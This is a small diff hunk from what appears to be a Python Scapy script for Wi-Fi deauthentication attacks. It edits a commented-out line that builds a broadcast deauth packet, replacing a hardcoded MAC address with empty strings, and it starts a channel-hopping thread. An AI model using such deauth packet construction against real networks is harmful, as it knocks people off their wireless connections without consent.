@@ -36,7 +36,7 @@ def deauth(ap, client):
 
 
 if __name__ == "__main__":
-    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="62:F4:51:7E:C3:3C", addr3="62:F4:51:7E:C3:3C")/Dot11Deauth(reason=2)
+    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="", addr3="")/Dot11Deauth(reason=2)
     #sendp(pket, iface=interface, verbose=False)
     thread = threading.Thread(target=hopper, args=(interface, ), name="hopper")
     thread.daemon = True
